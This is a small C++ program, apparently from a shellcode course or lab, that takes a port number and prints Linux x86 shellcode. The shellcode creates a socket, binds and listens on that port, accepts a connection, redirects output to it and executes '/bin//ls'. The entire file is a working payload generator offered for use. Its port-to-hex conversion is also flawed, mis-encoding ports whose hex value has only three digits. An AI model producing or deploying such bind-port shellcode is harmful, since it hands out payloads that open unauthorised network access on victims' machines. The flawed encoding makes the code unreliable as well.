/*
Author:	  evoche
License:  GPL
*/

#include <stdio.h>
#include <string.h>
#include <iostream>
#include <sstream> 

using namespace std;

int main()
{
	//base port number = 8888
	string portnumH = "\\x22";
	string portnumL = "\\xb8";

	cout << "Enter Port Number: ";
	int value;
	string portNo;

	// input check
	while(true) 
	{
		getline(cin,portNo);
		stringstream ss1(portNo);

		//(ss >> out) checks for valid conversion to integer
		//!(ss >> portNo) checks for unconverted input and rejects it
		if(ss1 >> value && !(ss1 >> portNo))
		{
			if(value > 1024 && value < 65535)//Well-known ports < 1024
			{
				break;
			}
		}
		cin.clear(); 
		cerr << "Enter again - has to be a valid integer between 1024 and 65535: ";
	}

	std::stringstream stream;
	stream << std::hex << value;
	std::string result(stream.str());
	
	portnumH = "\\x" + result.substr(0,2);
	portnumL = "\\x" + result.substr(2,2);

	std::stringstream ss2;

	ss2 << "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xb0\\x66\\x43\\x56\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x66\\x43\\x56\\x66\\x68" << portnumH << portnumL << "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x43\\x6a\\x01\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x56\\x56\\x52\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x3f\\x89\\xd3\\x6a\\x01\\x59\\xcd\\x80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x6c\\x73\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80";

	std::string output = ss2.str();

	cout << "\nShellcode: " << output << endl;

	return 0;
}

